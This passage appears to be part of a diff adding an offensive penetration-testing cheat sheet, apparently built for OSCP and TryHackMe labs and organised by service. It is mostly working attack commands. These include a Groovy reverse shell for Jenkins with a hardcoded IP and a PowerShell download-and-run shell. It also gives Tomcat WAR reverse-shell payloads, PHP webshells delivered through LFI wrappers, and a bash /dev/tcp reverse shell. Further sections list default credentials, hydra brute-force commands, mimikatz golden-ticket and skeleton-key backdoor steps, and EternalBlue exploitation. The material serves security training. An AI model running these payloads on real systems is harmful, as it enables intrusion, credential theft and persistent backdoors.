+ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.60.242 -fs {size}
+</code></pre></div></div>
+
+<h4 id="drupal-panel-rce">Drupal panel RCE</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You need the plugin php to be installed (check it accessing to /modules/php and if it returns a 403 then, exists, if not found, then the plugin php isn't installed)
+
+Go to Modules -&gt; (Check) PHP Filter  -&gt; Save configuration
+
+https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
+
+Then click on Add content -&gt; Select Basic Page or Article -&gt; Write php shellcode on the body -&gt; Select PHP code in Text format -&gt; Select Preview
+</code></pre></div></div>
+
+<h3 id="joomla">Joomla</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>joomscan -u &lt;URL&gt;
+./joomlavs.rb --url &lt;URL&gt; -a -v
+#default username: joomla
+</code></pre></div></div>
+<h4 id="joomla-panel-rce">Joomla panel RCE</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Navigate to Extensions > Templates > Templates and then choose the Protostar Details and Files template.
+Edit index.php
+</code></pre></div></div>
+
+<h3 id="tomcat">Tomcat</h3>
+
+<h4 id="default-credentials">Default credentials</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The most interesting path of Tomcat is /manager/html, inside that path you can upload and deploy war files (execute code). But  this path is protected by basic HTTP auth, the most common credentials are :
+
+admin:admin
+tomcat:tomcat
+admin:&lt;NOTHING&gt;
+admin:s3cr3t
+tomcat:s3cr3t
+admin:tomcat
+</code></pre></div></div>
+
+<h4 id="brute-force-2">Brute force</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; -f &lt;IP&gt; http-get /manager/html -vV -u
+</code></pre></div></div>
+
+<h4 id="tomcat-panel-rce">Tomcat panel RCE</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Generate payload
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f war &gt; shell.war
+
+# Upload payload
+Tomcat6 :
+wget 'http://&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;:8080/manager/deploy?war=file:shell.war&amp;path=/shell' -O -
+
+Tomcat7 and above :
+curl -v -u &lt;USER&gt;:&lt;PASSWORD&gt; -T shell.war 'http://&lt;IP&gt;:8080/manager/text/deploy?path=/shellh&amp;update=true'
+
+# Listener
+nc -lvp &lt;PORT&gt;
+
+# Execute payload
+curl http://&lt;IP&gt;:8080/shell/
+</code></pre></div></div>
+
+<h4 id="tomghost">tomghost</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Apache Tomcat 9.0.30
+#CVE-2020-1938 (AJP File Read/Inclusion)
+https://www.exploit-db.com/exploits/48143
+</code></pre></div></div>
+
+<h3 id="jenkins">Jenkins</h3>
+<h4 id="jenkins-panel-rce">Jenkins panel RCE</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code>Manage Jenkins -> Script Console -> Edit Groove Script shell -> Run (admin credentials needed)
+#GrooveScriptReverseShell (cmd="cmd.exe" for Windows)
+String host="10.4.56.144";
+int port=8044;
+String cmd="/bin/sh";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+</code></pre></div></div>
+or
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code>Browse to /job/project/configure -> Execute Windows batch command -> use this command to get the reverse shell on your machine and then run it:
+powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
+-> Save the configuration -> set up netcat -> go to /job/project -> build now (left menu bar)
+
+#Reference (contains shell): ~/Workspace/THM/Alfred
+</code></pre></div></div>
+
+<h3 id="openemr">OpenEMR</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Check if admin.php / setup.php is accessible for unauthenticated user:
+- Create new page
+  (Create new db if needed)
+  # CREATE DATABASE openemr;
+  # CREATE USER 'openemr_user'@'%' IDENTIFIED BY 'Password12';
+  # GRANT ALL PRIVILEGES ON openemr.* TO 'openemr_user'@'%';
+  # FLUSH PRIVILEGES;
+- https://www.exploit-db.com/exploits/45161 (Authenticated RCE exploit)
+</code></pre></div></div>
+
+<h3 id="codiad">Codiad</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit
+#version 2.8.4 - default password: password
+</code></pre></div></div>
+
+<h3 id="nagios">Nagios</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#default username: nagiosadmin
+#try: nagiosadmin:admin (or brute force with other passwords)
+#authenticated rce: https://www.exploit-db.com/exploits/49422
+
+#metasploit: (get root shell)
+use exploit/linux/http/nagios_xi_authenticated_rce
+(show options > set RHOSTS, LHOST, PASSWORD > run)
+</code></pre></div></div>
+
+<h3 id="sweet-rice">SweetRice</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#version 1.5.1
+SweetRice 1.5.1 - Arbitrary File Upload
+https://www.exploit-db.com/exploits/40716
+
+#upload shell manually
+Media Center > upload file
+Access /attachment
+  #(if can not upload file)
+    Ads > paste php reverse shell > save
+    Access /inc/ads/shell.php
+    (https://packetstormsecurity.com/files/139521/SweetRice-1.5.1-Code-Execution.html)
+#get db info
+Setting
+</code></pre></div></div>
+
+<h3 id="sweet-rice">Bolt</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#login page
+/bolt/login
+#Bolt CMS 3.7.0 (3.7.1) - Authenticated Remote Code Execution
+https://www.exploit-db.com/exploits/48296
+#metasploit search bolt (prefered)
+</code></pre></div></div>
+
+<h3 id="sweet-rice">Elastix</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#version 2.2.0, possibly others
+#FreePBX 2.10.0/2.9.0
+Try login as admin:admin
+CVE-2012-4869: https://github.com/AndyCyberSec/OSCP
+</code></pre></div></div>
+
+<h3 id="webdav">WebDav</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>davtest -url &lt;URL&gt;
+</code></pre></div></div>
+
+<h3 id="coldfusion">ColdFusion</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.exploit-db.com/exploits/14641 (1)
+https://github.com/k4u5h41/CVE-2009-2265
+
+(1) -> http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
+  -> get password hash -> use john crack it -> login to administrator panel -> DEBUGGING & LOGGING -> Scheduled Tasks
+  -> Schedule New Task -> Fill (Task Name; URL: http://192.168.119.164:8000/shell.jsp; Tick Publish; File: C:\ColdFusion8\wwwroot\shell.jsp)
+  -> Submit -> Run task -> On browser, go to: http://target-server/shell.jsp
+  #OR upload here C:\Inetpub\wwwroot\CFIDE then go here http://target-server/CFIDE/shell.jsp (or shell.cfm)
+</code></pre></div></div>
+
+<h3 id="http-brute-force-authentication">HTTP brute force authentication</h3>
+
+<h4 id="http-basic-authentication">HTTP basic authentication</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Hydra
+hydra -l &lt;USER&gt; -V -P &lt;PASSWORDS_LIST&gt; -s 80 -f &lt;IP&gt; http-get /&lt;URL_ENDPOINT&gt;/ -t 15
+
+# Patator
+python patator.py http_fuzz auth_type=basic url=&lt;URL&gt; user_pass=FILE0 0=&lt;USER:PASSWORD_LIST&gt; -x ignore:code=401 -x ignore:code=307
+</code></pre></div></div>
+
+<h4 id="http-get-request">HTTP GET request</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra &lt;IP&gt; -V -l &lt;USER&gt; -P &lt;PASSWORDS_LIST&gt; http-get-form "/login/:username=^USER^&amp;password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t &lt;THREADS_NUMBER&gt;
+</code></pre></div></div>
+
+<h4 id="http-post-request">HTTP POST request</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l &lt;USER&gt; -P &lt;PASSWORDS_LIST&gt; &lt;IP&gt; http-post-form "/webapp/login.php:username=^USER^&amp;password=^PASS^:Invalid:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t &lt;THREADS_NUMBER&gt;
+</code></pre></div></div>
+
+<h3 id="spidering--brute-force-directories--files">Spidering / Brute force directories / files</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gospider -d &lt;DEPTHS&gt; --robots --sitemap -t &lt;THREADS&gt; -s &lt;URL&gt;
+
+ffuf -w /home/liodeus/directory-list-lowercase-2.3-medium.txt -u &lt;URL&gt;/FUZZ -e .php,.txt -t &lt;THREADS&gt;
+dirbuster
+gobuster dir -u http://10.10.72.193/ -w ~/Workspace/THM/wordlists/directory-list-lowercase-2.3-medium.txt -x .php,.db,.bak,.zip,.exe
+
+Dictionaries :
+   - /usr/share/wordlists/dirb/common.txt
+   - /usr/share/wordlists/dirb/big.txt
+   - /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</code></pre></div></div>
+
+<h4 id="file-backups">File backups</h4>
+
+<p>Once you have found all the files, look for backups of all the executable files (“<em>.php</em>”, “<em>.aspx</em>“…). Common variations for naming a backup are</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file.ext~, file.ext.bak, file.ext.tmp, file.ext.old, file.bak, file.tmp and file.old
+</code></pre></div></div>
+
+<h3 id="local-file-inclusion--remote-file-inclusion---lfi--rfi">Local File Inclusion / Remote File Inclusion - LFI / RFI</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+</code></pre></div></div>
+
+<h4 id="wrappers">Wrappers</h4>
+
+<h5 id="wrapper-phpfilter">Wrapper php://filter</h5>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://example.com/index.php?page=php://filter/convert.base64-encode/resource=
+</code></pre></div></div>
+
+<h5 id="wrapper-expect">Wrapper expect://</h5>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://example.com/index.php?page=expect://id
+</code></pre></div></div>
+
+<h5 id="wrapper-data">Wrapper data://</h5>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo '&lt;?php phpinfo(); ?&gt;' | base64 -w0 -&gt; PD9waHAgcGhwaW5mbygpOyA/Pgo=
+
+http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=
+
+If code execution, you should see phpinfo(), go to the disable_functions and craft a payload with functions which aren't disable.
+
+Code execution with 
+	- exec
+	- shell_exec
+	- system
+	- passthru
+	- popen
+
+# Exemple
+echo '&lt;?php passthru($_GET["cmd"]);echo "Shell done !"; ?&gt;' | base64 -w0 -&gt; PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=
+
+http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=
+
+If there is "Shell done !" on the webpage, then there is code execution and you can do things like :
+
+http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=&amp;cmd=ls
+</code></pre></div></div>
+
+<h5 id="wrapper-input">Wrapper input://</h5>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -k -v "http://example.com/index.php?page=php://input" --data "&lt;?php echo shell_exec('id'); ?&gt;"
+</code></pre></div></div>
+
+<h4 id="useful-lfi-list">Useful LFI list</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Linux
+/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
+
+# Windows
+/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
+
+# Both
+/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
+</code></pre></div></div>
+
+<h4 id="tools">Tools</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kadimus --url &lt;URL&gt;
+python lfisuite.py
+</code></pre></div></div>
+
+<h3 id="command-injection">Command injection</h3>
+
+<p>For command injection always use BurpSuite !</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
+</code></pre></div></div>
+
+<h3 id="deserialization">Deserialization</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization
+</code></pre></div></div>
+
+<h3 id="file-upload">File upload</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
+</code></pre></div></div>
+
+<h3 id="sql-injection">SQL injection</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
+
+https://cobalt.io/blog/a-pentesters-guide-to-sql-injection-sqli
+</code></pre></div></div>
+
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<strong>From /THM/GameZone: SQLmap</strong>
+sqlmap -r request.txt --dbms=mysql --dump [-T tablename -C column1,column2]
+</code></pre></div></div>
+
+<h3 id="xss">XSS</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+beef-xss
+cat /usr/share/beef-xss/config.yaml | grep user -C 1 # user / password
+&lt;script src="http://&lt;IP&gt;:3000/hook.js"&gt;&lt;/script&gt;
+</code></pre></div></div>
+
+<h3 id="other-web-vulnerabilities">Other web vulnerabilities</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/swisskyrepo/PayloadsAllTheThings
+</code></pre></div></div>
+
+<h3 id="upload-a-file-with-put">Upload a file with PUT</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -X PUT http://&lt;IP&gt;/&lt;FILE&gt; -d @&lt;FILE&gt;  -v
+</code></pre></div></div>
+
+<h3 id="cves">CVEs (service - version)</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Apache:
+  2.4.49 - https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013
+    └──╼ $curl 'http://10.10.239.45/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; whoami && pwd && id' -H "Content-Type: text/plain"
+  
+  Apache Tomcat 9.0.30 (refer to tomghost)
+Port 5986 - https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure/
+          - https://github.com/AlteredSecurity/CVE-2021-38647
+
+  Apache Struts 2.3 < 2.3.34 / 2.5 < 2.5.16 - https://github.com/LightC0der/Apache-Struts-0Day-Exploit
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sar2HTML:
+  3.2.1 - https://www.exploit-db.com/exploits/47204
+    └──╼ http://192.168.190.35/sar2HTML/index.php?plot=;whoami
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Squid proxy:
+  /etc/squid/squid.conf (get credentials here)
+  borg extract /path/to/downloaded-repo::my-files
+  https://fieldraccoon.github.io/posts/Cyborg/
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dirty Pipe (CVE-2022-0847):
+  uname -r
+  Version affected: Linux 5.8 or later (fixed in 5.16.11, 5.15.25, 5.10.102)
+  https://insight.fsoft.com.vn/conf/display/SSA2021/Research+CVE-2022-0847%3A+Dirty+Pipe
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jquery-file-upload
+CVE-2018-9206: https://www.exploit-db.com/exploits/45584
+
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Rejetto HTTP File Server (HFS) 2.3.x RCE (#httpfileserver)
+CVE-2014-6287: https://www.exploit-db.com/exploits/34668
+http://target/?search=%00{.exec|cmd.}
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Advanced Comment System (advanced_comment_system)
+CVE-2020-35598: https://www.exploit-db.com/exploits/49343
+http://localhost/advanced_component_system/index.php?ACS_path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00
+(#LFI2RCE) curl -s --data "&lt;?system('bash -i &gt;& /dev/tcp/IP/PORT 0&gt;&1');?&gt;" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="kerberos---88">KERBEROS - 88</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Enumeration w/Kerbrute
+  ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
+Harvesting & Brute-Forcing Tickets w/Rubeus
+  #From Windows
+  (Harvesting Tickets w/Rubeus)
+  Rubeus.exe harvest /interval:30
+  (Brute-Forcing / Password-Spraying w/Rubeus)
+  echo MACHINE_IP CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
+  Rubeus.exe brute /password:Password1 /noticket
+Kerberoasting 
+  w/Rubeus (From Windows): 
+    Rubeus.exe kerberoast
+    hashcat -m 13100 -a 0 hash.txt Pass.txt
+  OR
+  w/Impacket (From Linux):
+    cd /usr/share/doc/python3-impacket/examples/
+    sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request
+    hashcat -m 13100 -a 0 hash.txt Pass.txt
+AS-REP Roasting w/Rubeus
+  #From Windows
+  Rubeus.exe asreproast 
+  /format:hashcat /outfile:hashes.asreproast
+  hashcat -m 18200 hash.txt Pass.txt
+'''Pass the Ticket w/mimikatz
+  mimikatz.exe
+  privilege::debug [output should be '20' OK to ensure it has the administrator privilege]
+  sekurlsa::tickets /export
+  kerberos::ptt &lt;ticket&gt;
+  (cmd) klist
+'''
+Golden/Silver Ticket Attacks w/mimikatz
+  Dump the krbtgt hash
+    mimikatz.exe
+    lsadump::lsa /inject /name:krbtgt (for Golden)
+    OR lsadump::lsa /inject /name:&lt;other domain admin account or a service account (i.e. SQLService account)&gt; (for Silver)
+  Create a Golden/Silver Ticket
+    kerberos::golden /user:Administrator /domain:controller.local /sid:&lt;Domain: S-&gt; /krbtgt:&lt;PrimaryNTLM&gt; /id:[500] (for Golden)
+    kerberos::golden /user:Administrator /domain:controller.local /sid: /rc4:&lt;NTML hash&gt; /id:[1103] (for Silver)
+  Use the Golden/Silver Ticket to access other machines
+    (mimikatz) misc::cmd
+    dir \\Desktop-1\c$
+    PsExec.exe \\Desktop-1 cmd.exe
+'''Kerberos Backdoors w/mimikatz
+  (mimikatz) misc::skeleton
+  Accessing the forest
+    net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
+    dir \\Desktop-1\c$ /user:Machine1 mimikatz
+'''
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="pop3---110">POP3 - 110</h2>
+
+<h3 id="brute-force-3">Brute force</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l &lt;USER&gt; -P &lt;PASSWORDS_LIST&gt; -f &lt;IP&gt; pop3 -V
+hydra -S -v -l &lt;USER&gt; -P &lt;PASSWORDS_LIST&gt; -s 995 -f &lt;IP&gt; pop3 -V
+</code></pre></div></div>
+
+<h3 id="read-mail">Read mail</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>telnet &lt;IP&gt; 110
+
+USER &lt;USER&gt;
+PASS &lt;PASSWORD&gt;
+LIST
+RETR &lt;MAIL_NUMBER&gt;
+QUIT
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="snmp---161">SNMP - 161</h2>
+
+<h3 id="brute-force-community-string">Brute force community string</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>onesixtyone -c /home/liodeus/wordlist/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt &lt;IP&gt;
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snmpbulkwalk -c &lt;COMMUNITY_STRING&gt; -v&lt;VERSION&gt; &lt;IP&gt;
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snmp-check &lt;IP&gt;
+</code></pre></div></div>
+
+<h3 id="modifying-snmp-values">Modifying SNMP values</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://net-snmp.sourceforge.net/tutorial/tutorial-5/commands/snmpset.html
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="ldap---389">LDAP - 389</h2>
+
+<h3 id="scans">Scans</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -n -sV --script "ldap* and not brute"
+
+ldapsearch -h &lt;IP&gt; -x -s base
+ldapsearch -h &lt;IP&gt; -x -D '&lt;DOMAIN&gt;\&lt;USER&gt;' -w '&lt;PASSWORD&gt;' -b "DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;"
+ldapsearch -x -b &lt;search_base> -H &lt;ldap_host> -D &lt;bind_dn> -W "objectclass=*"
+
+ex: ldapsearch -x -b "dc=local,dc=com" -H ldap://192.168.x.100 -D "cn=admin,dc=local,dc=com" -W "(objectclass=account)"
+ldapsearch -x -b "dc=local,dc=com" -H ldap://192.168.x.100 -D "cn=admin,dc=local,dc=com" -W "objectclass=*"
+</code></pre></div></div>
+
+<h3 id="graphical-interface">Graphical Interface</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jxplorer
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="smb---445">SMB - 445</h2>
+
+<h3 id="version-if-nmap-didnt-detect-it">Version if nmap didn’t detect it</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sometimes nmap doesn’t show the version of Samba in the remote host, if this happens, a good way to know which version the remote host is running, is to capture traffic with wireshark against the remote host on 445/139 and in parallel run an smbclient -L, do a follow tcp stream and with this we might see which version the server is running.
+
+OR
+
+sudo ngrep -i -d &lt;INTERFACE&gt; 's.?a.?m.?b.?a.*[[:digit:]]' port 139
+smbclient -L &lt;IP&gt;
+#OR nmap --script smb-enum-shares -p 139,445 &lt;ip>
+
+#Enum users:
+  nmap --script smb-enum-users -p 139,445 10.1.1.68
+</code></pre></div></div>
+
+<h3 id="scan-for-vulnerability">Scan for vulnerability</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -p139,445 --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 &lt;IP&gt;
+</code></pre></div></div>
+
+<p>If :</p>
+
+<ul>
+  <li>MS17-010 - <a href="#EternalBlue%20(MS17-010)">EternalBlue</a></li>
+  <li>MS08-067 - <a href="#MS08-067">MS08-067</a></li>
+  <li>CVE-2017-7494 - <a href="#CVE-2017-7494">CVE-2017-7494</a></li>
+</ul>
+
+<h3 id="manual-testing">Manual testing</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap -H &lt;IP&gt;
+smbmap -u '' -p '' -H &lt;IP&gt;
+smbmap -u 'guest' -p '' -H &lt;IP&gt;
+smbmap -u '' -p '' -H &lt;IP&gt; -R
+
+crackmapexec smb &lt;IP&gt;
+crackmapexec smb &lt;IP&gt; -u '' -p ''
+crackmapexec smb &lt;IP&gt; -u 'guest' -p ''
+crackmapexec smb &lt;IP&gt; -u '' -p '' --shares
+
+enum4linux -a &lt;IP&gt;
+
+smbclient --no-pass -L //$IP
+smbclient //&lt;IP&gt;/&lt;SHARE&gt; (-U &lt;user&gt; -p &lt;port&gt;)
+
+# Download all files from a directory recursively
+smbclient //&lt;IP&gt;/&lt;SHARE&gt; -U &lt;USER&gt; -c "prompt OFF;recurse ON;mget *"
+</code></pre></div></div>
+
+<h3 id="brute-force-4">Brute force</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb &lt;IP&gt; -u &lt;USERS_LIST&gt; -p &lt;PASSWORDS_LIST&gt;
+hydra -V -f -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; smb://&lt;IP&gt; -u -vV
+</code></pre></div></div>
+
+<h3 id="mount-a-smb-share">Mount a SMB share</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir /tmp/share
+sudo mount -t cifs //&lt;IP&gt;/&lt;SHARE&gt; /tmp/share
+sudo mount -t cifs -o 'username=&lt;USER&gt;,password=&lt;PASSWORD&gt;'//&lt;IP&gt;/&lt;SHARE&gt; /tmp/share
+
+smbclient //&lt;IP&gt;/&lt;SHARE&gt;
+smbclient //&lt;IP&gt;/&lt;SHARE&gt; -U &lt;USER&gt;
+</code></pre></div></div>
+
+<h3 id="get-a-shell">Get a shell</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>psexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
+psexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;
+
+wmiexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
+wmiexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;
+
+smbexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
+smbexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;
+
+atexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt; &lt;COMMAND&gt;
+atexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;
+</code></pre></div></div>
+
+<h3 id="eternalblue-ms17-010">EternalBlue (MS17-010)</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/3ndG4me/AutoBlue-MS17-010
+</code></pre></div></div>
+
+<h4 id="check-if-vulnerable">Check if vulnerable</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python eternal_checker.py &lt;IP&gt;
+</code></pre></div></div>
+
+<h4 id="prepare-shellcodes-and-listeners">Prepare shellcodes and listeners</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd shellcode
+./shell_prep.sh
+cd ..
+./listener_prep.sh
+</code></pre></div></div>
+
+<h4 id="exploit">Exploit</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python eternalblue_exploit&lt;NUMBER&gt;.py &lt;IP&gt; shellcode/sc_all.bin
+
+May need to run it multiple times
+</code></pre></div></div>
+
+<h4 id="if-this-doesnt-work-try-this-one">If this doesn’t work, try this one</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python zzz_exploit.py &lt;IP&gt;
+</code></pre></div></div>
+
+<h3 id="ms08-067">MS08-067</h3>
+
